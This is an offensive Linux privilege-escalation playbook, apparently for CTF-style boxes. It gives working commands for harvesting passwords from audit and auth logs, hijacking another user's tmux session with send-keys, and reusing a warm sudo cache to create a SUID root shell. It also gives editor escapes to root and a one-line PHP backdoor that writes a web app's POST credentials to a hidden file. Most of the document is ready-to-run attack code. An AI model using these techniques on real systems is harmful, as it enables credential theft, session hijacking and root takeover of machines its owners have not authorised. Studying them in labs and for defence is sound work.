# Log Argv Leaks + tmux Session Takeover + sudo Cache Reuse

## When this applies

- Linux foothold as a low-priv user.
- The user is in a log-reading group (`adm`, `systemd-journal`, `audit`, `wheel`-readable logs) OR has access to a tmux/screen socket owned by a higher-priv user.
- Goal: harvest credentials from logs, hijack live sudo caches, or drive an existing privileged pty.

This file covers three composable post-foothold primitives that often appear together on Linux boxes where the box owner left an admin tmux session running:

1. **Log argv leaks** — `/var/log/audit/audit.log`, `/var/log/auth.log`, journald, `~/.bash_history`, laurel-formatted records contain command lines invoked at boot or by service units. Passwords are commonly passed as argv (e.g., `expect`-driven scripts, `tmux send-keys "password"`, `sshpass -p`, `mysql -p<pw>`).
2. **tmux session takeover via send-keys** — when a higher-priv user has a detached tmux session whose socket the attacker can read (group ACL or shared `/tmp/tmux-<uid>`), `tmux -S <sock> send-keys` injects arbitrary keystrokes into that session, including running commands inside any sudo-cached pty.
3. **sudo cache reuse** — `Defaults timestamp_timeout=-1` (or any positive value) keeps the current pty's sudo authentication valid; re-driving that exact pty gives passwordless root.

## Primitive 1 — Log argv credential mining

```bash
# Common readable logs by group
ls -l /var/log/audit /var/log/auth.log /var/log/syslog /var/log/laurel
groups   # check for adm, systemd-journal, audit

# audit/laurel record per syscall — argv is in EXECVE.aN fields, often hex-encoded
grep -i "execve" /var/log/audit/audit.log | head
ausearch -k <key>                     # if auditd rules tagged keys
journalctl _COMM=expect _COMM=sshpass _COMM=tmux  # systemd-journal group
laurel-cli search --executable expect # if laurel is shipping JSON

# Decode hex-encoded EXECVE arguments (e.g. a0=2F757372..., a1=2D63..., a2=...)
python3 -c 'import sys; [print(bytes.fromhex(x).decode()) for x in sys.argv[1:]]' \
  2F62696E2F62617368 2D63 73656E64202D6B65797320275061737340313233270D
```

**High-signal commands to grep for in any log/history file:**
- `expect`/`unbuffer` invocations (passwords usually argv-passed)
- `tmux send-keys '<password>'` (boot scripts that auto-attach + type creds)
- `sshpass -p '<pw>'`, `mysql -u root -p<pw>`, `mysqldump -p<pw>`, `mongoimport --password <pw>`
- `curl -u user:pass`, `git clone https://user:pass@...`
- `useradd -p '<crypted>'`, `chpasswd` stdin lines
- `openssl enc -k <pw>` and any `--password=` flag

```bash
# Generic argv-credential sweeper
grep -hE "(password|passwd|secret|token|key|sshpass|expect.*spawn|send-keys|--password=|-p[^ ]{6,}|mysql.*-p|/c/Users/|curl.*://[^/]+:)" \
  /var/log/audit/audit.log /var/log/syslog /var/log/auth.log ~/.bash_history /home/*/.bash_history 2>/dev/null
```

## Primitive 2 — tmux session takeover via send-keys

```bash
# Find tmux/screen sockets you can write to
find /tmp -name "tmux-*" -ls 2>/dev/null
find / -name "S.*" -path "*tmux*" -perm -g=w 2>/dev/null
ls -l /tmp/tmux-*/

# Attach (if perms allow) — read mode first
tmux -S /tmp/tmux-1001/default ls
tmux -S /tmp/tmux-1001/default attach-session -t <name> -r   # read-only

# Inject keystrokes into the live session (executes inside that user's shell)
tmux -S /tmp/tmux-1001/default send-keys -t <name> "id > /tmp/.who" Enter
tmux -S /tmp/tmux-1001/default send-keys -t <name> \
   "sudo cp /root/root.txt /tmp/r; sudo chmod 644 /tmp/r" Enter

# screen equivalent
screen -ls -S /tmp/screens/S-<user>
screen -S <name> -X stuff "id\\n"
```

**Why it works.** tmux's socket honours unix DAC; a misconfigured world-readable / group-writable socket lets any peer steer the running shell. If that shell is inside the user's normal pty, every keystroke runs with that user's identity — including any commands that would re-use a still-cached `sudo`.

## Primitive 3 — sudo cache reuse via the live pty

`sudo` caches authentication per-(uid, tty) for `Defaults timestamp_timeout=N` minutes (default 5, often 15, sometimes `-1` = forever). The cache lives at `/run/sudo/ts/<user>` and is keyed on the kernel `tty` of the running pty.

```bash
# Inspect Defaults
sudo -nl 2>&1 | head      # "may not run sudo" with no password = uncached
grep -E "timestamp_timeout|timestamp_type" /etc/sudoers /etc/sudoers.d/* 2>/dev/null

# Check existing cache (no password = warm)
sudo -n true && echo "CACHED" || echo "cold"

# Drive the live tmux pty to use its warm cache
tmux -S <sock> send-keys -t <sess> "sudo /bin/sh -c 'cp /bin/bash /tmp/.b; chmod +s /tmp/.b'" Enter
# Then in your own shell:
/tmp/.b -p   # SUID root shell
```

**Long-lived service ptys.** `boot.service` / `auto.expect` / `systemd-run --pty` units that ran sudo at boot keep the cached entry until reboot when `timestamp_timeout=-1` is set. Any user able to reach that pty (via tmux send-keys, `chvt`, or a writable socket) inherits passwordless root for the lifetime of the box.

## Editor-and-pager privesc reminders (paired with sudo cache)

When sudoers gives the target user NOPASSWD access to a text editor or pager, the GTFOBins escape is one keystroke once you can drive the pty:

```text
nano file               then ^T ("Execute Command")    → arbitrary shell
nano file               then ^R^X to read into buffer  → file read as user
vi/vim                  then :!sh                      → shell
less/more file          then !sh                       → shell
man <anything>          then !sh                       → shell (pages through less)
ed                      then !sh                       → shell
```

Combined with Primitive 2, this becomes: `tmux send-keys "sudo nano /etc/<allowed_file>" Enter`, wait for nano, then `tmux send-keys C-t "/bin/sh" Enter` to spawn a root shell inside the editor.

## Backdoor file placement under systemd PrivateTmp

When backdooring a web app's PHP/Python entrypoint to capture creds (e.g., `/usr/share/zabbix/index.php` writing to `/tmp/.zlog`), the captured file may **not** appear at `/tmp/.zlog` from a separate shell. Apache, nginx, mysql, postgres, and many other services on Ubuntu/Debian/RHEL run with `PrivateTmp=true` under their systemd unit — the unit gets its own `/tmp` namespace at `/tmp/systemd-private-<hash>-<unit>-XXXX/tmp/`. Files written by the service are invisible from any pty that wasn't spawned inside the same namespace.

```bash
# Detect PrivateTmp
systemctl show apache2.service | grep -E "PrivateTmp|TemporaryFileSystem"
# PrivateTmp=yes → /tmp is per-unit; check the real path:
ls /tmp/systemd-private-*-apache2.service-*/tmp/ 2>/dev/null

# Workaround: write to a path the SERVICE has perms for AND that is shared (no PrivateTmp on /usr, /var)
# /usr/share/<app>/local/.log, /var/lib/<app>/.log, /var/www/.log
echo '<?php file_put_contents("/usr/share/zabbix/local/.zlog", base64_encode($_POST), FILE_APPEND); ?>' \
  >> /usr/share/zabbix/index.php
```

Same pattern applies to systemd's `ProtectSystem=full`, `ReadOnlyPaths=`, and `InaccessiblePaths=` directives: read the unit file (`/lib/systemd/system/<svc>.service`) before assuming a path is reachable.

## CI/CD agent root inheritance (TeamCity, Jenkins, GoCD)

When the build agent process is launched at boot from a `systemd` unit running as root (`User=root` or no User= directive at all), every build runs with **root privileges** — no CVE needed. With `SYSTEM_ADMIN` or "Edit Project" rights in TeamCity / "Configure" permission in Jenkins, a one-line "Command Line" build step (`cat /root/root.txt > /tmp/r`) is the entire root chain. Always check:

```bash
ps -eo user,cmd | grep -E "TeamCity|Jenkins|gocd|drone" | head
systemctl cat teamcity-agent jenkins | grep -E "User=|Exec"
ls -l /opt/teamcity/buildAgent/work/ /var/lib/jenkins/  # owner = the user builds run as
```

If the agent is root, any write to a build configuration is privesc.

## Verifying success

- Argv mining: cleartext password in stdout, confirmed with `su <user>` or `ssh <user>@localhost`.
- tmux takeover: `id > /tmp/.who` written, content matches the session owner's uid.
- sudo cache reuse: `whoami` after the editor escape returns `root`; `cp /root/root.txt /tmp/r` succeeds.

## Common pitfalls

- Reading `/var/log/audit/audit.log` requires the `adm` (Debian/Ubuntu) or `audit`/`wheel` (RHEL) group — `groups` first; otherwise journalctl might still expose argv via `_COMM`+`_CMDLINE`.
- tmux `send-keys` requires the literal `Enter` token to commit a line — `\n` inside the string is sent as the two characters, not Return.
- `sudo` caches per kernel `tty`, not per process. If the live tmux pty is `/dev/pts/3` and you `su` into a different pts, the cache does NOT travel — you must drive the original pts via send-keys.
- `Defaults targetpw` or `Defaults runaspw` invalidates the user-keyed cache — read `/etc/sudoers` first.

## Tools

- ausearch / auditctl / laurel-cli (audit log query)
- journalctl (`_COMM=`, `_UID=`, `MESSAGE=` filters)
- tmux / screen (session takeover)
- GTFOBins (https://gtfobins.github.io/) — editor / pager / scripting-tool escapes
